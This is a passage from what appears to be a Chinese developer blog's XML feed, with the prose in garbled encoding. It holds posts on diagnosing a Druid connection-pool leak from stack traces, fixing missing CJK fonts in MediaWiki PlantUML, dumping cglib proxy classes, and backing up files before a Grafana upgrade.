<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é˜²æ­¢åˆ›å»ºè¶…è¿‡maxActiveæ•°é‡çš„è¿æ¥</span></span><br><span class="line"><span class="keyword">if</span> (activeCount + poolingCount &gt;= maxActive) &#123;</span><br><span class="line">  <span class="comment">// DruidDataSource.java:2448</span></span><br><span class="line">  empty.await();</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¥‡æ€ªçš„æ˜¯ï¼Œåˆ›å»ºè¿æ¥çš„çº¿ç¨‹åœ¨ç­‰å¾…emptyçš„æ¡ä»¶ã€‚é—®é¢˜å¯èƒ½å°±å‡ºåœ¨<code>activeCount + poolingCount &gt;= maxActive</code>è¿™ä¸ªæ¡ä»¶ä¸Šï¼Œå…¶ä»–çº¿ç¨‹éƒ½åœ¨ç­‰å¾…è¿æ¥ï¼Œæ‰€ä»¥<code>poolingCount</code>è‚¯å®šæ˜¯0ï¼ˆè¿æ¥æ± é‡Œæ²¡æœ‰ç©ºé—²çš„è¿æ¥ï¼‰ï¼Œé‚£ä¹ˆæœ‰é—®é¢˜çš„è‚¯å®šæ˜¯<code>activeCount</code>è¿™é‡Œäº†ã€‚</p>
<p>ç¬¬ä¸€ååº”æ˜¯<code>druid</code>çš„bugï¼Œå»githubçš„issueä¸Šæ‰¾äº†å¥½ä¹…ä¹Ÿæ²¡æœ‰æ‰¾åˆ°ç±»ä¼¼çš„bugï¼Œåªèƒ½å†æ·±å…¥çš„æŒ–æ˜ç³»ç»Ÿçš„é”™è¯¯æ—¥å¿—ï¼Œæœ€ç»ˆè¿˜æ˜¯æ‰¾åˆ°äº†ä¸€äº›ç«¯å€ªã€‚æœ€åˆæ–­å¼€è¿æ¥çš„æ—¶å€™å‡ºé”™æ—¥å¿—ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">2020-04-09 17:32:29.321 ERROR [pms-provider-prod,cbcb523cffa38a5d,cbcb523cffa38a5d,<span class="literal">false</span>] --- [io-11022-exec-2] c.a.m.h.m.i.MyBatisMigrateChainIdKiller  : migrate.helper.MyBatisMigrateChainIdKillerErrorå¤„ç†è¿‡ç¨‹å‡ºç°é”™è¯¯,</span><br><span class="line"></span><br><span class="line">org.springframework.jdbc.CannotGetJdbcConnectionException: Failed to obtain JDBC Connection; nested exception is com.microsoft.sqlserver.jdbc.SQLServerException: SQL Server æœªè¿”å›å“åº”ã€‚è¿æ¥å·²å…³é—­ã€‚</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:81)</span><br><span class="line">	at org.mybatis.spring.transaction.SpringManagedTransaction.openConnection(SpringManagedTransaction.java:82)</span><br><span class="line">	at org.mybatis.spring.transaction.SpringManagedTransaction.getConnection(SpringManagedTransaction.java:68)</span><br><span class="line">	at com.atour.migrate.helper.mybatis.interceptor.MyBatisMigrateChainIdKiller.checkDsIgnoreTableStatus(MyBatisMigrateChainIdKiller.java:181)</span><br><span class="line">	...</span><br><span class="line">Caused by: com.microsoft.sqlserver.jdbc.SQLServerException: SQL Server æœªè¿”å›å“åº”ã€‚è¿æ¥å·²å…³é—­ã€‚</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.terminate(SQLServerConnection.java:1667)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.terminate(SQLServerConnection.java:1654)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSReader.readPacket(IOBuffer.java:4844)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSCommand.startResponse(IOBuffer.java:6154)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSCommand.startResponse(IOBuffer.java:6106)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection<span class="variable">$1ConnectionCommand</span>.doExecute(SQLServerConnection.java:1756)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSCommand.execute(IOBuffer.java:5696)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(SQLServerConnection.java:1715)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.connectionCommand(SQLServerConnection.java:1761)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.setCatalog(SQLServerConnection.java:2063)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:750)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl.setCatalog(ConnectionProxyImpl.java:437)</span><br><span class="line">	at com.alibaba.druid.pool.DruidPooledConnection.setCatalog(DruidPooledConnection.java:910)</span><br><span class="line">	at com.atour.db.DynamicDataSource.getConnection(DynamicDataSource.java:143)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:151)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:115)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:78)</span><br><span class="line">	... 131 common frames omitted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2020-04-09 17:32:43.701 ERROR [pms-provider-prod,,,] --- [reate-219971169] com.alibaba.druid.pool.DruidDataSource   : create connection SQLException, url: jdbc:sqlserver://xxx:3433;DatabaseName=xx, errorCode 0, state 08S01</span><br><span class="line"></span><br><span class="line">com.microsoft.sqlserver.jdbc.SQLServerException: é€šè¿‡ç«¯å£ 1433 è¿æ¥åˆ°ä¸»æœº R8IC10364 çš„ TCP/IP è¿æ¥å¤±è´¥ã€‚é”™è¯¯:â€œnullã€‚è¯·éªŒè¯è¿æ¥å±æ€§ã€‚ç¡®ä¿ SQL Server çš„å®ä¾‹æ­£åœ¨ä¸»æœºä¸Šè¿è¡Œï¼Œä¸”åœ¨æ­¤ç«¯å£æ¥å— TCP/IP è¿æ¥ï¼Œè¿˜è¦ç¡®ä¿é˜²ç«å¢™æ²¡æœ‰é˜»æ­¢åˆ°æ­¤ç«¯å£çš„ TCP è¿æ¥ã€‚â€ã€‚</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDriverError(SQLServerException.java:190)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerException.ConvertConnectExceptionToSQLServerException(SQLServerException.java:241)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SocketFinder.findSocket(IOBuffer.java:2243)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSChannel.open(IOBuffer.java:491)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.connectHelper(SQLServerConnection.java:1309)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2020-04-09 17:33:09.338 ERROR [pms-provider-prod,69497e80a3d973de,69497e80a3d973de,<span class="literal">false</span>] --- [io-11022-exec-9] c.a.m.h.m.i.MyBatisMigrateChainIdKiller  : migrate.helper.MyBatisMigrateChainIdKillerErrorå¤„ç†è¿‡ç¨‹å‡ºç°é”™è¯¯,</span><br><span class="line"></span><br><span class="line">org.springframework.jdbc.CannotGetJdbcConnectionException: Failed to obtain JDBC Connection; nested exception is com.microsoft.sqlserver.jdbc.SQLServerException: Database <span class="string">'xxx'</span> cannot be opened. It is <span class="keyword">in</span> the middle of a restore.</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:81)</span><br><span class="line">	at org.mybatis.spring.transaction.SpringManagedTransaction.openConnection(SpringManagedTransaction.java:82)</span><br><span class="line">	...</span><br><span class="line">Caused by: com.microsoft.sqlserver.jdbc.SQLServerException: Database <span class="string">'xxxx'</span> cannot be opened. It is <span class="keyword">in</span> the middle of a restore.</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDatabaseError(SQLServerException.java:216)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSTokenHandler.onEOF(tdsparser.java:254)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSParser.parse(tdsparser.java:84)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSParser.parse(tdsparser.java:39)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection<span class="variable">$1ConnectionCommand</span>.doExecute(SQLServerConnection.java:1756)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSCommand.execute(IOBuffer.java:5696)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(SQLServerConnection.java:1715)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.connectionCommand(SQLServerConnection.java:1761)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.setCatalog(SQLServerConnection.java:2063)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:750)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl.setCatalog(ConnectionProxyImpl.java:437)</span><br><span class="line">	at com.alibaba.druid.pool.DruidPooledConnection.setCatalog(DruidPooledConnection.java:910)</span><br><span class="line">	at com.atour.db.DynamicDataSource.getConnection(DynamicDataSource.java:143)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:151)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:115)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:78)</span><br><span class="line">  ... 131 common frames omitted</span><br></pre></td></tr></table></figure>
<p>å¼‚å¸¸æ ˆä¸­å…³é”®çš„ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Connection <span class="title">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">	Connection connection = <span class="keyword">this</span>.determineTargetDataSource().getConnection();</span><br><span class="line">	<span class="keyword">if</span>(dynamicInstance) &#123;</span><br><span class="line">		<span class="comment">/**æ•°æ®æºåˆ›å»ºåˆ°å®ä¾‹ç»´åº¦ï¼Œè·å–è¿æ¥ä¹‹å‰è®¾ç½®æ•°æ®åº“å*/</span></span><br><span class="line">    <span class="comment">// è¿™é‡ŒsetCatalogæŠ›å‡ºäº†å¼‚å¸¸</span></span><br><span class="line">		connection.setCatalog(databaseNameMap.get(DynamicDataSourceHolder.getDataSouce()));</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> connection;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆdruidçš„é…ç½®æ²¡æœ‰è®¾ç½®<code>testOnBorrow</code>ï¼Œæ‹¿åˆ°è¿æ¥ä¹‹åæ²¡æœ‰æ ¡éªŒè¿æ¥çš„æœ‰æ•ˆæ€§ï¼›</p>
<p>å…¶æ¬¡ï¼Œç”±äºåˆ†åº“å¤ªå¤šï¼ˆå®ä¾‹æ²¡æœ‰é‚£ä¹ˆå¤šï¼‰ï¼Œå…¬å¸å¼€å‘äº†ä¸­é—´ä»¶ï¼ŒåŠ¨æ€åˆ‡æ¢æ•°æ®åº“ï¼ˆå°±æ˜¯ä¸Šé¢çš„ä»£ç ï¼Œä¸€ä¸ªdruidå®ä¾‹é»˜è®¤å°±æœ‰ä¸€ä¸ªCreateçº¿ç¨‹å’ŒDestroyçº¿ç¨‹ï¼Œæœ‰ä¸Šç™¾åˆ†åº“çš„æ—¶å€™ï¼Œå¼€é”€å°±ç›¸å½“å¤§ï¼‰ã€‚</p>
<p><strong>è¿æ¥æ± çš„å˜åŒ–</strong></p>
<p>æ•°æ®åº“åˆšå¼€å§‹æ–­å¼€çš„æ—¶å€™ï¼Œä¸šåŠ¡çº¿ç¨‹æ‹¿åˆ°è¿æ¥ä¹‹åï¼Œæ‰§è¡Œ<code>setCatalog</code>æ“ä½œï¼Œæ­¤æ—¶ä¼šå¤±è´¥ï¼Œç„¶åæ²¡æœ‰catchå…³é—­å¯¹åº”çš„æ•°æ®åº“è¿æ¥ï¼Œå°±ä¼šå ç”¨druidçš„ä¸€ä¸ªactive countï¼›</p>
<p>ä¸­é—´æœ‰åˆ›å»ºè¿æ¥Druid-ConnectionPool-C<code>reate-219971169</code>ï¼Œ å°è¯•åˆ›å»ºï¼Œç„¶åå¤±è´¥äº†ã€‚</p>
<p>åç»­æ•°æ®åº“åº”è¯¥å¯ä»¥è¿ä¸Šäº†ï¼Œä½†æ˜¯åˆ‡æ¢åˆ†åº“ä¼šæœ‰é—®é¢˜ï¼Œä¹Ÿä¼šå ç”¨druidçš„ä¸€ä¸ªactive countï¼›</p>
<p>æœ€ç»ˆactive count ä¼šè¢«å æ»¡ï¼Œç„¶åå°±æ— æ³•åˆ›å»ºè¿æ¥ï¼Œä¸šåŠ¡çº¿ç¨‹å’Œè¿æ¥åˆ›å»ºçº¿ç¨‹éƒ½ä¼šä¸€ç›´ç­‰å¾…ã€‚</p>
<h2 id="æ”¹è¿›"><a href="#æ”¹è¿›" class="headerlink" title="æ”¹è¿›"></a>æ”¹è¿›</h2><ul>
<li><p>å¿…é¡»è®¾ç½®è·å–è¿æ¥çš„ç­‰å¾…æ—¶é—´ï¼ˆmaxWait) å’Œæœ€å¤§ç­‰å¾…çº¿ç¨‹ä¸ªæ•°ï¼ˆmaxWaitThreadCountï¼‰ã€‚</p>
</li>
<li><p>æ“ä½œè¿æ¥çš„æ—¶å€™ï¼Œä¸€å®šè¦åœ¨å¼‚å¸¸çš„æƒ…å†µä¸‹å…³é—­è¿æ¥ï¼Œä¸è¦é€ æˆè¿æ¥çš„æ³„éœ²</p>
</li>
<li>å¯ä»¥è®¾ç½®druidçš„<ul>
<li><code>removeAbandoned</code> ï¼ˆæ˜¯å¦å¼ºåˆ¶å…³é—­è¿æ¥æ—¶é•¿å¤§äºremoveAbandonedTimeoutMillisçš„è¿æ¥ï¼‰</li>
<li><code>removeAbandonedTimeoutMillis</code> ï¼ˆä¸€ä¸ªè¿æ¥ä»è¢«è¿æ¥åˆ°è¢«å…³é—­ä¹‹é—´çš„æœ€å¤§ç”Ÿå‘½å‘¨æœŸï¼‰</li>
<li><code>logAbandoned</code> ï¼ˆå¼ºåˆ¶å…³é—­è¿æ¥æ—¶æ˜¯å¦è®°å½•æ—¥å¿—ï¼‰</li>
</ul>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> druid </category>
            
        </categories>
        
        
        <tags>
            
            <tag> druid </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mediawiki-plantuml]]></title>
      <url>http://qsli.github.io/2020/03/23/mediawiki-plantuml/</url>
      <content type="html"><![CDATA[<p>mediawikiçš„plantumlæ’ä»¶ï¼Œåœ¨æ¸²æŸ“ä¸­æ–‡çš„æ—¶å€™ï¼Œå‘ç°æ–‡å­—ä¸¢äº†ã€‚</p>
<img src="/2020/03/23/mediawiki-plantuml/WeChatWorkScreenshot_0e466b8c-c8f5-48c4-bcab-45db7ddbf597.png">
<p>æ–¹æ¡†é‡Œä¸­æ–‡çš„è¯´æ˜éƒ½æ²¡æœ‰äº†ï¼Œæœ€åå‘ç°æ˜¯ç¼ºå°‘å­—ä½“ï¼Œè¿™é‡Œmarkä¸‹ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install cjkuni-uming-fonts</span><br></pre></td></tr></table></figure>
<p>å®‰è£…å®Œå­—ä½“å°±å¥½äº†:</p>
<img src="/2020/03/23/mediawiki-plantuml/uml-13d5bec9d5aa4740c2198be487d50707-b9db094fe17005d80a48cfc93309f835.png">]]></content>
      
        <categories>
            
            <category> mediawiki </category>
            
        </categories>
        
        
        <tags>
            
            <tag> plantuml </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[cglib-tips]]></title>
      <url>http://qsli.github.io/2020/03/23/cglib-tips/</url>
      <content type="html"><![CDATA[<ul>
<li>è®¾ç½®debugçš„ç¯å¢ƒå˜é‡</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¯¥è®¾ç½®ç”¨äºè¾“å‡ºcglibåŠ¨æ€ä»£ç†äº§ç”Ÿçš„ç±»</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">System.setProperty(DebuggingClassWriter.DEBUG_LOCATION_PROPERTY, <span class="string">"/tmp/"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¯¥è®¾ç½®ç”¨äºè¾“å‡ºjdkåŠ¨æ€ä»£ç†äº§ç”Ÿçš„ç±»</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">System.getProperties().put(<span class="string">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span>, <span class="string">"true"</span>);</span><br></pre></td></tr></table></figure>
<img src="/2020/03/23/cglib-tips/image-20200322181246078.png">
<ul>
<li>æˆ–è€…ä½¿ç”¨ HSDBï¼ˆHotspotçš„debugå·¥å…·ï¼‰</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo java -classpath <span class="string">"/Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home/lib/sa-jdi.jar"</span>  sun.jvm.hotspot.HSDB</span><br></pre></td></tr></table></figure>
<p>attachåˆ°æŒ‡å®šçš„è¿›ç¨‹ä¹‹åï¼Œé€‰æ‹©class browserï¼Œå°±å¯ä»¥æ‰¾åˆ°åŠ¨æ€ç”Ÿæˆçš„ç±»</p>
<img src="/2020/03/23/cglib-tips/image-20200322181636481.png">
<p>ç‚¹è¿›å»</p>
<img src="/2020/03/23/cglib-tips/image-20200322181729901.png">
<p>ä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆå¯¹åº”çš„classæ–‡ä»¶ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">âœ  /tmp  tree</span><br><span class="line">.</span><br><span class="line">â”œâ”€â”€ com</span><br><span class="line">â”‚Â Â  â””â”€â”€ air</span><br><span class="line">â”‚Â Â      â””â”€â”€ mvc</span><br><span class="line">â”‚Â Â          â””â”€â”€ SampleController$<span class="variable">$EnhancerBySpringCGLIB</span>$<span class="variable">$d680c039</span>.class</span><br></pre></td></tr></table></figure>
<p>å¯¹åº”çš„classæ–‡ä»¶å°±åˆ›å»ºäº†ï¼Œå¯ä»¥æ‹–åˆ°ideaæˆ–è€…å…¶ä»–çš„å·¥å…·ä¸­æŸ¥çœ‹ï¼Œä¹Ÿå¯ä»¥æŸ¥çœ‹ç±»çš„ç»§æ‰¿å…³ç³»</p>
<img src="/2020/03/23/cglib-tips/image-20200322181908616.png">]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> cglib </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å‡çº§grafana]]></title>
      <url>http://qsli.github.io/2019/01/10/grafana-upgrade/</url>
      <content type="html"><![CDATA[<h2 id="ç¼˜èµ·"><a href="#ç¼˜èµ·" class="headerlink" title="ç¼˜èµ·"></a>ç¼˜èµ·</h2><p>ç›®å‰çš„grafanaç‰ˆæœ¬è¿‡ä½ï¼Œåªæœ‰åœ¨çŠ¶æ€å˜åŒ–çš„æ—¶å€™æ‰å‘é€æŠ¥è­¦çš„æé†’</p>
<blockquote>
<p>Grafana sends notifications on state changes, so OK -&gt; Alerting, Alerting -&gt; OK, OK -&gt; NoData, etc</p>
</blockquote>
<p>é«˜ç‰ˆæœ¬æœ‰work aroundå¯ä»¥è§£å†³ï¼š</p>
<blockquote>
<p>This is possible since 5.3 if you configure alert reminder at the same or lower interval as the alert rule.</p>
<p>Itâ€™s not exactly whatâ€™s described in this issue but its close enough that we wonâ€™t implement this feature.</p>
</blockquote>
<h2 id="å½“å‰é…ç½®ä¿¡æ¯"><a href="#å½“å‰é…ç½®ä¿¡æ¯" class="headerlink" title="å½“å‰é…ç½®ä¿¡æ¯"></a>å½“å‰é…ç½®ä¿¡æ¯</h2><p>å½“å‰ç‰ˆæœ¬ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ sudo yum list installed | grep grafana</span><br><span class="line">grafana.x86_64                        4.6.3-1                        installed</span><br></pre></td></tr></table></figure>
<p>å¯åŠ¨è„šæœ¬ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ ps axu | grep grafana</span><br><span class="line">qisheng+ 24599  0.0  0.0 112660   976 pts/1    S+   14:10   0:00 grep --color=auto grafana</span><br><span class="line">grafana  28995  0.9  0.2 2414524 46008 ?       Ssl  Jan08  28:22 /usr/sbin/grafana-server --config=/etc/grafana/grafana.ini --pidfile=/var/run/grafana/grafana-server.pid cfg:default.paths.logs=/var/<span class="built_in">log</span>/grafana cfg:default.paths.data=/var/lib/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins</span><br></pre></td></tr></table></figure>
<p>LDAPé…ç½®ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#################################### Auth LDAP ##########################</span></span><br><span class="line">[auth.ldap]</span><br><span class="line">enabled = <span class="literal">true</span></span><br><span class="line">config_file = /etc/grafana/ldap.toml</span><br><span class="line">allow_sign_up = <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h2 id="é£é™©è¯„ä¼°"><a href="#é£é™©è¯„ä¼°" class="headerlink" title="é£é™©è¯„ä¼°"></a>é£é™©è¯„ä¼°</h2><p>grafanaåªæ˜¯ä½œä¸ºå±•ç¤ºå±‚ï¼Œå‡çº§å¯¹ç¨‹åºæ‰“ç‚¹å’Œæ•°æ®æ”¶é›†æ— å½±å“ï¼Œè€Œä¸”grafanaæ˜¯åå‘å…¼å®¹çš„ï¼›å‡çº§åªä¼šå½±å“ç›‘æ§çš„æŸ¥çœ‹å’ŒæŠ¥è­¦ã€‚</p>
<blockquote>
<p>We recommend everyone to upgrade Grafana often to stay up to date with the latest fixes and enhancements. In order make this a reality Grafana upgrades are backward compatible and the upgrade process is simple &amp; quick.</p>
</blockquote>
<h2 id="å‡çº§æ­¥éª¤"><a href="#å‡çº§æ­¥éª¤" class="headerlink" title="å‡çº§æ­¥éª¤"></a>å‡çº§æ­¥éª¤</h2><h3 id="å¤‡ä»½é…ç½®æ–‡ä»¶"><a href="#å¤‡ä»½é…ç½®æ–‡ä»¶" class="headerlink" title="å¤‡ä»½é…ç½®æ–‡ä»¶"></a>å¤‡ä»½é…ç½®æ–‡ä»¶</h3><ul>
<li>/etc/grafana/grafana.ini </li>
<li>/etc/grafana/ldap.toml</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ sudo cp -p /etc/grafana/ldap.toml ~/</span><br><span class="line">[qisheng.li@yd-devops-web yum.repos.d]<span class="variable">$sudo</span> cp -p  /etc/grafana/grafana.ini  ~/</span><br></pre></td></tr></table></figure>
<h3 id="å¤‡ä»½db"><a href="#å¤‡ä»½db" class="headerlink" title="å¤‡ä»½db"></a>å¤‡ä»½db</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ sudo cp -p /var/lib/grafana/grafana.db ~/</span><br></pre></td></tr></table></figure>
